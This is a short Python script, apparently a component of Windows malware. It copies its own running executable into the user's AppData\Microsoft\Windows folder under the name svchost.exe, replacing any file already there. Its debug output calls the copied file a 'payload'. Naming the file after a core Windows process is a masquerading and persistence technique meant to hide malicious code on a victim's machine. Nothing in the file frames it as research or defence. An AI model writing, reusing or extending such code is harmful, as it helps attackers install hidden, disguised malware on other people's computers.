import os
import shutil
import sys

def get_dest_path():
    appdata = os.getenv("APPDATA")
    dest_dir = os.path.join(appdata, "Microsoft", "Windows")
    os.makedirs(dest_dir, exist_ok=True)
    return os.path.join(dest_dir, "svchost.exe")

def relocate_payload():
    source = sys.executable
    destination = get_dest_path()

    print(f"[DEBUG] Current Path: {source}")
    print(f"[DEBUG] Destination Path: {destination}")

    if os.path.exists(destination):
        try:
            os.remove(destination)
            print("[+] Existing file removed.")
        except Exception as e:
            print(f"[!] Error removing file: {e}")

    try:
        shutil.copy2(source, destination)
        print("[+] Payload successfully relocated.")
    except Exception as e:
        print(f"[!] Error copying file: {e}")

if __name__ == "__main__":
    relocate_payload()
